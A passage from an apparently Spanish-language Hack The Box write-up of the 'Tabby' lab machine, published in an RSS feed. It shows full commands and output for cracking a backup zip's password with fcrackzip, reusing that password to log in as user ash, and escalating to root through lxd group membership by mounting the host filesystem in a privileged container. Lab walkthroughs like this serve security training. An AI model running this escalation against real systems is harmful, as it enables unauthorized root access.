&lt;h1 id=&#34;ash---user&#34;&gt;ASH - USER&lt;/h1&gt;
&lt;p&gt;En el directorio &lt;code&gt;/var/www/html/files&lt;/code&gt; encontramos un archivo zip el cual esta protegido con contraseña, utilizamos &lt;code&gt;fcrackzip&lt;/code&gt; para obtener la contraseña y el contenido de este archivo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;tomcat@tabby:/var/www/html/files$ ls -lah
ls -lah
total 36K
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; ash  ash  4.0K Jun &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 21:59 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; root root 4.0K Jun &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 16:24 ..
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ash  ash  8.6K Jun &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 13:42 16162020_backup.zip
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root 4.0K Jun &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 20:13 archive
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root 4.0K Jun &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 20:13 revoked_certs
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root 6.4K Jun &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 11:25 statement
tomcat@tabby:/var/www/html/files$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Aunque encontramos la contraseña, al descomprimir el archivo no logramos leer alguna credencial dentro de los archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/htb/tabby$ fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip 

PASSWORD FOUND!!!!: &lt;span class=&#34;nv&#34;&gt;pw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; admin@it

kali@kali:~/htb/tabby$ tree var/
var/
└── www
    └── html
        ├── assets
        ├── favicon.ico
        ├── files
        ├── index.php
        ├── logo.png
        ├── news.php
        └── Readme.txt

&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; directories, &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; files
kali@kali:~/htb/tabby$

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos la contraseña del archivo comprimido que encontramos con el usuario &lt;code&gt;ash&lt;/code&gt; en la maquina y logramos obtener una shell con este usuario y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/Screenshot_9.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;id&lt;/code&gt; y vemos que el usuario pertenece al grupo de &lt;code&gt;lxd&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ash@tabby:~$ id
id
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;adm&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,24&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;cdrom&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,30&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;dip&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,46&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;plugdev&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,116&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;lxd&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ash@tabby:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ya que este usuario pertenece a este grupo (lxd) vamos a escalar privilegios a traves de este al igual que en las maquinas presentadas en &lt;a href=&#34;https://sckull.github.io/tags/lxd/&#34;&gt;&lt;strong&gt;THM - LXD&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#LOCAL&lt;/span&gt;
git clone  https://github.com/saghul/lxd-alpine-builder.git
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; lxd-alpine-builder
./build-alpine -a i686

&lt;span class=&#34;c1&#34;&gt;#MACHINE&lt;/span&gt;
lxc image import ./alpine-v3.12-i686-20200924_0424.tar.gz --alias myimage
lxc image list

&lt;span class=&#34;c1&#34;&gt;#Si no funcionan los comandos --&amp;gt; lxd init&lt;/span&gt;
lxc init myimage sckull -c security.privileged&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
lxc config device add sckull mydevice disk &lt;span class=&#34;nv&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/ &lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/mnt/root &lt;span class=&#34;nv&#34;&gt;recursive&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
lxc start sckull
lxc &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; sckull /bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logramos obtener una shell root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ash@tabby:~$ lxc image import ./alpine-v3.12-i686-20200924_0424.tar.gz --alias myimage
&amp;lt;ine-v3.12-i686-20200924_0424.tar.gz --alias myimage
If this is your first &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; running LXD on this machine, you should also run: lxd init
To start your first instance, try: lxc launch ubuntu:18.04

ash@tabby:~$ lxc image list
lxc image list
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  ALIAS  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; FINGERPRINT  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; PUBLIC &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;          DESCRIPTION          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ARCHITECTURE &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   TYPE    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  SIZE  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;         UPLOAD DATE          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; myimage &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 850be888e99a &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; no     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; alpine v3.12 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;20200924_04:24&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; i686         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; CONTAINER &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 3.07MB &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Sep 24, &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; at 8:40am &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UTC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
ash@tabby:~$ lxc init myimage sckull -c security.privileged&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
lxc init myimage sckull -c security.privileged&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
Creating sckull
ash@tabby:~$ lxc config device add sckull mydevice disk &lt;span class=&#34;nv&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/ &lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/mnt/root &lt;span class=&#34;nv&#34;&gt;recursive&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&amp;lt;ydevice disk &lt;span class=&#34;nv&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/ &lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/mnt/root &lt;span class=&#34;nv&#34;&gt;recursive&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
Device mydevice added to sckull
ash@tabby:~$ lxc start sckull
lxc start sckull
ash@tabby:~$ lxc &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; sckull /bin/sh
lxc &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; sckull /bin/sh
~ &lt;span class=&#34;c1&#34;&gt;# whoami&lt;/span&gt;
whoami
root
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/Screenshot_10.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://tomcat.apache.org/tomcat-8.0-doc/manager-howto.html#Deploy_a_Directory_or_WAR_by_URL&#34;&gt;&lt;strong&gt;Docs - Deploy War by URL&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/tabby/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/tabby/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>lfi</category>
            
          
            
              <category>dotdotpwn</category>
            
          
            
              <category>tomcat</category>
            
          
            
              <category>msfvenom</category>
            
          
            
              <category>fcrackzip</category>
            
          
            
              <category>lxc</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>